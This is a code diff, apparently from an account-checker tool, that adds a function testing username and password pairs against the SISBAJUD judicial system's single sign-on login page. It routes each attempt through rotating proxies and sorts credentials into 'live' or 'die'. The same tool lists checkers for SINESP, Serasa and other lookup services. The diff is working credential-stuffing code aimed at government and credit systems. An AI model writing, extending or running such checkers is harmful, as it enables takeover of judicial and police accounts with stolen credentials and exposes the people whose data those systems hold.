@@ -79,6 +79,7 @@ CHECKERS = {
     "checkonn":      "CheckONN",
     "sinesp":        "SINESP",
     "serasa":        "Serasa Empresas",
+    "sisbjud":       "SISBAJUD",
 }
 
 # ── Database ────────────────────────────────────────────────────────────────────
@@ -557,6 +558,34 @@ def _chk_serasa(user, pwd, px_fn):
     except Exception as e:
         return ("erro", str(e)[:60])
 
+_SISBJUD_URL_LOGIN = (
+    "https://sso.cloud.pje.jus.br/auth/realms/pje/protocol/openid-connect/auth"
+    "?client_id=sisbajud&redirect_uri=https://sisbajud.cnj.jus.br/&response_type=code"
+)
+
+def _chk_sisbjud(user, pwd, px_fn):
+    try:
+        s  = requests.Session()
+        px = px_fn()
+        r = s.get(_SISBJUD_URL_LOGIN, proxies=px, timeout=15)
+        form = BeautifulSoup(r.text, "html.parser").find("form", {"id": "kc-form-login"})
+        if not form:
+            return ("erro", "sem form de login")
+        action = form.get("action")
+        r2 = s.post(
+            action,
+            data={"username": user, "password": pwd, "login": "Entrar"},
+            proxies=px, timeout=15,
+        )
+        html = r2.text
+        if "Usuário ou senha inválido" in html:
+            return ("die", "")
+        if "kc-form-login" in html:
+            return ("die", "")
+        return ("live", "")
+    except Exception as e:
+        return ("erro", str(e)[:60])
+
 CHECKER_FN = {
     "checkok":       _chk_checkok,
     "consultcenter": _chk_consultcenter,
@@ -568,6 +597,7 @@ CHECKER_FN = {
     "checkonn":      _chk_checkonn,
     "sinesp":        _chk_sinesp,
     "serasa":        _chk_serasa,
+    "sisbjud":       _chk_sisbjud,
 }
 
 # ── Proxy generator (admin only) ────────────────────────────────────────────────
